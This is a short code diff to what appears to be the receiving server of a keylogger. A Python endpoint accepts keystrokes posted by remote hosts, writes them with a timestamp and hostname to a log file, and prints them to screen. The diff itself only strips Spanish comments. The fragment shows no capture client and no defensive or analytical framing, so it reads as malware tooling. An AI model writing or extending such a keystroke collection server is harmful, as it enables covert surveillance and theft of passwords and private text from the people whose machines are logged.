@@ -13,11 +13,9 @@ def receive_log():
         keystrokes = data.get('keystrokes', '')
         timestamp = datetime.now().strftime("%H:%M:%S")
         
-        # Guardar en archivo
         with open("received_logs.txt", "a", encoding="utf-8") as f:
             f.write(f"[{timestamp}] [{hostname}] {keystrokes}\n")
         
-        # Mostrar en pantalla
         print(f"[{timestamp}] [{hostname}] {keystrokes[:100]}")
         
         return jsonify({"status": "ok"}), 200
@@ -35,7 +33,6 @@ if __name__ == "__main__":
     print("=" * 50)
     print()
     
-    # Obtener IP local
     import socket
     hostname = socket.gethostname()
     local_ip = socket.gethostbyname(hostname)
